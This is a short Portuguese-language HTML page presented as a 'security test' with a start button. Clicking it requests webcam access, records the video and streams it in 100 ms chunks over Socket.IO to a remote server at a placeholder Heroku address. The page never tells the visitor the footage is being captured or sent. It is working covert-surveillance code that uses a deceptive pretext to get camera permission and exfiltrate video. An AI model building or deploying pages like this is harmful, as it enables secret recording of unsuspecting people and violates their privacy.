<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Teste de Segurança</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script> <!-- Socket.IO -->
</head>
<body>
    <h1>Bem-vindo ao teste de segurança!</h1>
    <p>Clique para iniciar o teste.</p>
    <button id="start">Iniciar Teste</button>

    <script>
        const socket = io('https://seu-servidor.herokuapp.com'); // URL do servidor Node.js

        document.getElementById('start').addEventListener('click', () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.ondataavailable = event => {
                        if (event.data.size > 0) {
                            // Enviar o vídeo em tempo real para o servidor via WebSocket
                            socket.emit('video-stream', event.data);
                        }
                    };
                    mediaRecorder.start(100); // Segmentos de 100ms
                })
                .catch(error => {
                    console.error("Erro ao acessar a câmera:", error);
                });
        });
    </script>
</body>
</html>
